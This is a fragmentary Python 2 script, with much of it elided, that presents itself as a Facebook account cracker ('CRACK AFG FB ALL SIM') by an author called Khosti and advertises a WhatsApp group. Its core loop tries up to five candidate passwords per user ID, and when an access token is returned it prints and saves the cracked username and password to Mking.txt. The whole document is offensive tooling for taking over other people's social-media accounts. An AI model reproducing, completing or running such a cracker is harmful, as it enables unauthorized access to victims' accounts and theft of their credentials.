...
def telegram():
	...
	os.system("xdg-open https://chat.whatsapp.com/DI5MlEolzRPAB5z0NfeVpy")
...
██   ██  ██   ██ 
\033[1;97m--------------------------------------------------
\033[1;91m Author      : Khosti 
\033[1;91m GitHub      : Criminal
\033[1;91m WATSAPP   : 93783361438
\033[1;91m WATSAPP   : https://chat.whatsapp.com/DI5MlEolzRPAB5z0NfeVpy
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY KHOSTI '
        print '\x1b[1;92m THISE SCRIPT CREATED BY KHOSTI  '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print ' \x1b[1;93m[Arman_CP] ' + k + c + user + ' | ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    print ' \x1b[1;93m[Arman_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Mking.txt', 'a')
                    ...
                    if 'access_token' in q:
                        ...
                        print ' \x1b[1;93m[Arman_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('Mking.txt', 'a')
                        ...
                        if 'access_token' in q:
                            ...
                            print ' \x1b[1;93m[Arman_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('Mking.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                print ' \x1b[1;93m[Arman_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('Mking.txt', 'a')
